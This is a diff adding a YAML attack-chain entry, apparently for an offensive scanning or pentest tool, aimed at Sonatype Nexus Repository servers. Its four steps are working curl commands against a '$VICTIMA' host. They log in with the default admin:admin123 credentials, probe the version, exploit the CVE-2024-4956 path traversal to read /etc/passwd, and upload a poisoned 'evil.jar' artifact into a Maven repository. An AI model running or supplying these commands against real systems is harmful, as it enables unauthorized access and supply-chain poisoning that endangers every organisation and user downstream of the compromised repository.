@@ -1,0 +1,47 @@
+chain_id: nexus_default_creds
+title: "Sonatype Nexus Repository — admin:admin123 default + CVE-2024-4956"
+severity: HIGH
+tags: [web, nexus, default-creds, repository, cve-2024-4956]
+
+trigger:
+  any_of:
+    - { banner_pattern: "(?i)nexus|sonatype" }
+    - { path_pattern: "(?i)/(nexus|service/rest/v1)" }
+    - { port: 8081 }
+
+description: |
+  Sonatype Nexus Repository OSS / Pro. Defaults are `admin:admin123` on
+  fresh installs (some on-prem mirrors keep them forever). With admin,
+  every artifact / npm tarball / docker image / pypi wheel that fed
+  the org's pipelines is yours to alter. CVE-2024-4956 is a recent
+  unauth path traversal on Repository 3.x.
+
+steps:
+  - id: 1
+    title: "Default-cred probe"
+    command: |
+      curl -u admin:admin123 http://$VICTIMA:8081/service/rest/v1/repositories | jq
+
+  - id: 2
+    title: "Version probe"
+    command: |
+      curl -s http://$VICTIMA:8081/service/rest/v1/status | jq
+
+  - id: 3
+    title: "CVE-2024-4956 path traversal (unauth)"
+    command: |
+      curl --path-as-is "http://$VICTIMA:8081/%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+
+  - id: 4
+    title: "Pull a single repository's metadata + drop poisoned artifact"
+    command: |
+      curl -u admin:admin123 -X POST \
+        -H 'Content-Type: multipart/form-data' \
+        -F 'maven2.groupId=com.evil' -F 'maven2.artifactId=pwn' \
+        -F 'maven2.version=1.0' -F 'maven2.asset1=@evil.jar' \
+        -F 'maven2.asset1.extension=jar' \
+        http://$VICTIMA:8081/service/rest/v1/components?repository=maven-snapshots
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2024-4956
+  - https://help.sonatype.com/repomanager3/system-configuration/security-settings
